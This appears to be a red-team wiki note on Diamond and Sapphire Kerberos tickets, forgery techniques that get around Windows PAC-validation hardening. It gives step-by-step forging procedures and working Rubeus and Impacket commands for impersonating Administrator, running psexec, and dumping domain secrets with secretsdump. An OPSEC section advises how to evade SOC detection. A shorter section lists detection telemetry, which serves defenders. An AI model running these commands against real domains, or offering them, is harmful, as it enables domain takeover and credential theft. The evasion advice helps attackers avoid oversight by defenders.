---
title: Diamond & Sapphire tickets — modern golden variants
slug: diamond-and-sapphire-tickets
aliases: [diamond-ticket, sapphire-ticket, modern-golden-ticket]
---

> **TL;DR:** Diamond and Sapphire tickets are post-2022 evasions of Microsoft's PAC-validation hardening (CVE-2021-42287/CVE-2022-37967, NoPAC mitigation). Diamond = decrypt a *real* TGT and re-sign with the krbtgt key, keeping legitimate group memberships. Sapphire = use S4U2Self + U2U to coax a DC into issuing a real PAC for any user, then graft it on. Both look more like real tickets than classic [[golden-tickets]] because the PAC structure comes from the DC, not from `mimikatz` invention.

## Mental model

A classic golden ticket is **fully forged**: mimikatz builds a TGT from scratch using only the krbtgt hash. Detection vectors:

- PAC fields with mimikatz-default values (LogonHours all 1s, KerbValidationInfo flags = 0).
- Missing `Authentication Authority Asserted Identity` SID (`S-1-18-1`) — DCs added this in 2021.
- PAC_REQUESTOR field (added by CVE-2022-37967 hardening) absent or wrong.
- Encryption type RC4 when domain enforces AES.

The mitigations made naive goldens trivially detectable on a hardened domain. **Diamond** and **Sapphire** sidestep different parts of the problem.

### Diamond ticket

1. Request a *legitimate* TGT for a low-priv user via `AS-REQ` (you have their password / hash).
2. Decrypt the TGT's enc-part with the krbtgt key (you have it).
3. Edit the PAC — change `EffectiveName`, `UserId`, add `GroupIds = {512, 519, 518}` (DA/EA/SA), keep all the other fields the DC populated (logon time, account flags, asserted-identity SID, PAC_REQUESTOR with the original user's SID — *not* the spoofed one).
4. Re-encrypt with the krbtgt key, re-sign the PAC, replay as the impersonated user.

Result: structure matches a real DC-issued TGT in every field except the ones you needed to lie about.

### Sapphire ticket

1. Have a low-priv user account with `password` or `aes` key.
2. Send `S4U2Self` request as that user **with a U2U flag**, asking for a service ticket *for the user themselves*, but specifying `cname-in-pac` of a different account (e.g., `Administrator`).
3. Pre-2022 DCs return a TGT-like ST with a fresh, DC-built PAC for `Administrator` — including every group, every asserted-identity SID, every PAC field, properly signed.
4. Repackage as a TGT (substitute service name) and inject. Replay with `getST.py` chain to mint service tickets.

Result: the PAC is **literally created by the DC** for the target user. No PAC field is forged.

## Preconditions

| Ticket | Krbtgt hash | Real user creds | Domain patch level |
|---|---|---|---|
| Golden | required | none | works on unpatched; trips PAC_REQUESTOR/asserted-id checks on Win2022+ DCs with all CVE-2022-37967 phases enforced |
| Diamond | required | required (any user, for AS-REQ shape) | works against modern domains; PAC shape is real |
| Sapphire | not required | required | works against domains without CVE-2021-42287 mitigations or with U2U S4U enabled (Win2019 and older, many Win2022 baselines) |

Diamond gives you golden-power without forging PAC structure; Sapphire gives you a real DC-issued PAC for free, without krbtgt.

## Tradecraft

### Diamond

```bash
# Rubeus (Windows) — primary implementation
Rubeus.exe diamond /tgtdeleg /ticketuser:victim /ticketuserid:1107 /groups:512,513,518,519,520 \
  /krbkey:<aes256 of krbtgt> /enctype:aes256 /nowrap

# Impacket (Linux) — uses --impersonate path
# Steps: (1) getTGT.py for self  (2) ticketer.py --tgt mytgt.ccache --use-krbtgt-key
ticketer.py -nthash <krbtgt_nt> -domain-sid <S-1-5-21-...> -domain corp.lab \
  -aesKey <krbtgt_aes256> -extra-pac -extra-sid <S-1-5-21-...-519> impersonate
```

### Sapphire

```bash
# Impacket — ticketer.py / getST.py chain (ThePorgs fork preferred)
getST.py -spn 'krbtgt/corp.lab' -impersonate Administrator -u2u -self \
  -dc-ip 10.10.10.10 corp.lab/low:'pw' -no-pass
# Output: Administrator.ccache — looks like a TGT with DC-issued PAC

# Rubeus
Rubeus.exe s4u /user:low /rc4:<low_nt> /impersonateuser:Administrator /self /altservice:krbtgt/corp.lab /nowrap
```

Once you have the ticket, set `KRB5CCNAME` and use it transparently:

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
psexec.py -k -no-pass corp.lab/Administrator@dc.corp.lab
secretsdump.py -k -no-pass corp.lab/Administrator@dc.corp.lab -just-dc
```

## Detection / Telemetry

- **Event 4769 (Kerberos service ticket request) with `Service Name = krbtgt`** — strong signal for Sapphire (S4U2Self with self-targeted service name is rare in benign traffic).
- **Mismatched `cname` vs `PAC.LogonInfo.EffectiveName`** — Diamond and Sapphire both expose this if the analyst parses the PAC. Most SIEMs don't, but ETW provider `Microsoft-Windows-Kerberos/Operational` event 4768 has the fields.
- **`AuthenticationServiceRequest` from a single user followed by `ServiceTicketRequest` for high-priv SPNs within seconds**: Diamond reuses the AS-REQ → exchange ratio is normal, but the *follow-on access* by an account whose normal pattern doesn't include DC admin reveals it.
- **PAC_REQUESTOR mismatch**: with CVE-2022-37967 phase-3 enforced, the DC rejects tickets whose PAC_REQUESTOR doesn't match the cname. Diamond handles this; naive Sapphire on a fully-patched DC fails (`KDC_ERR_TGT_REVOKED`).
- **Asserted-Identity SID**: `S-1-18-1` (Authentication Authority Asserted Identity) or `S-1-18-2` (Service Asserted Identity). Forged tickets often lack these. Diamond preserves them (copied from the real TGT). Sapphire's DC-built PAC includes them naturally.

## OPSEC pitfalls

- **Krbtgt rotation** kills Golden *and* Diamond instantly — both depend on the krbtgt key. Sapphire doesn't, which is the key OPSEC advantage on a tenant with proactive krbtgt rotation policy.
- Rubeus `diamond` defaults to `enctype:rc4`. On AES-only domains this throws `KDC_ERR_ETYPE_NOTSUPP` or shows up as RC4 anomaly. Always pass `/enctype:aes256` and the AES key, not the NT hash.
- Sapphire's S4U2Self+U2U path requires the DC to honour U2U for self-targets. Win2022 with all 2024 CVE patches partially closed this — test against the target DC version (`Get-ADDomainController | select OperatingSystemVersion`) before relying on it.
- Ticket lifetime defaults to the domain's maximum (10h / renewable 7d). Don't request a non-standard `endtime` — that's a tell.
- The DC logs the *real* AS-REQ from your low-priv account; if the SOC correlates that account's logon to a sudden DA-equivalent action, the chain is visible even without PAC parsing.

## References

- https://www.semperis.com/blog/whats-a-diamond-ticket/
- https://www.trustedsec.com/blog/a-diamond-ticket-in-the-rough/
- https://www.semperis.com/blog/sapphire-ticket-explained/
- https://github.com/GhostPack/Rubeus
- https://github.com/ThePorgs/impacket
- https://learn.microsoft.com/en-us/security-updates/securitybulletins/2022/cve-2022-37967

See also: [[golden-tickets]], [[silver-tickets]], [[kerberos]], [[kerberoasting]], [[s4u2self-abuse]], [[constrained-delegation]], [[dcsync]], [[impacket-toolkit-overview]]
